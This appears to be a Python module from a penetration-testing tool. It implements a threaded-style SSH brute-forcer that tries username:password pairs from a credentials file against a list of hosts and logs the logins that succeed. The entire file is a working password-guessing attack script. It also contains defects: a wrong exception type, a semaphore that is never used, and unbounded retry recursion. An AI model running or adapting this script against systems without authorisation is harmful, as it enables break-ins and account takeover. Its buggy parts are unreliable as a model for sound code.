from pexpect import pxssh
import time
from threading import *
import logging

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green

# global variables for threads coordination
Found = False
Fails = 0

class ContinueBrute(Exception):
    pass


class SSH_BruteForcer(object):

    def __init__(self, target_list, credfile, thread):
        self.connection_lock = BoundedSemaphore(value=thread)
        self.target_list = target_list
        self.findings = []

        try:
            self.credfile = open(credfile,'r')
        except FileExistsError:
            logging.warning(R+'Credentials file does not exist, exiting...'+W)
            exit(1)


    def connect(self, host, user, password, port, release):
        """
        handle the ssh connection and try the credentials
        :param host: string
        :param user: string
        :param password: string
        :param port: string
        :param release: boolean
        :return:
        """
        global Found, Fails
        try:
            ssh = pxssh.pxssh(echo=False)
            ssh.login(server=host, port=port, username=user, password=password)
            time.sleep(1)
            logging.info(G + 'SSH Password Found for host: %s:%s \nUsername: %s \nPassword: %s' % (host, port, user, password) +W)
            finding = host + ';' + port + ';' + 'SSH' + ';' + 'Default Credentials' + ';' + 'SSHBrute' + ';' + \
                      'SSH Password Found for host: %s:%s Username: %s Password: %s' % (host, port, user, password)
            self.findings.append(finding)
            Found = True
        except Exception as e:
            if 'read_nonblocking' in str(e):
                Fails += 1
                time.sleep(5)
                self.connect(host, user, password, port, False)
            elif 'synchronize with original prompt' in str(e):
                Fails += 1
                time.sleep(1)
                self.connect(host, user, password, port, False)

        finally:
            if release:
                pass


    def run(self):
        """
        Launch the attack
        :return: findings
        """
        global Found, Fails
        for host in self.target_list:
            logging.debug('Host: '+host)
            Fails = 0
            target = host.split(':')[0]
            port = host.split(':')[1]
            self.credfile.seek(0)
            logging.info('Testing: %s:%s' % (target, port))
            try:
                for line in self.credfile.readlines():
                    logging.debug('line: '+str(line))
                    user = line.split(':')[0].strip('\r').strip('\n')
                    password = line.split(':')[1].strip('\r').strip('\n')
                    if Found:
                        raise ContinueBrute

                    if Fails > 5:
                        logging.warning(R + 'Too many errors for host: %s:%s' % (target, port)+W)
                        raise ContinueBrute
                    logging.debug('Testing host: %s:%s \nUsername: %s \nPassword: %s' % (target, port, user, password))
                    self.connect(target, user, password, port, True)

            except ContinueBrute:
                Found = False
                continue

        return self.findings
